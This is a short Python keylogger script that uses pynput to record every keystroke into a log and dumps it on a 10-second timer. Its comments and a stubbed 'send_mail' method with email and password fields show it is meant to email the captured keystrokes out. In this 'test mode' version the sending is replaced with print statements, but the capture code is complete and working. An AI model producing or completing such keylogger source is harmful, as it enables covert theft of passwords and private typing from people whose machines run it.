from pynput import keyboard
import threading
import time

class Keylogger:
    def __init__(self):
        self.log = ""
        self.email = "dummy@example.com"
        self.password = "dummy"  # not used in test mode

    def save_data(self, key):
        try:
            self.log += key.char
        except AttributeError:
            # handle special keys
            self.log += f"[{key}]"

    def report(self):
        """
        Normally would send email.
        In test mode, just print the log length and first 50 chars.
        """
        print(f"[REPORT] Log length: {len(self.log)}")
        print(f"[REPORT] Log preview: {self.log[:50]}")
        # Reset log after reporting
        self.log = ""

    # Override send_mail to avoid SMTP
    def send_mail(self, email, password, message):
        print(f"[TEST MODE] send_mail called. Message length: {len(message)}")
        print(f"[TEST MODE] Message preview: {message[:50]}")

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            print("[INFO] Keylogger started. Press keys to test...")
            # For testing, report every 10 seconds instead of sending emails
            def periodic_report():
                while True:
                    time.sleep(10)
                    self.report()

            t = threading.Thread(target=periodic_report, daemon=True)
            t.start()
            keyboard_listener.join()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()

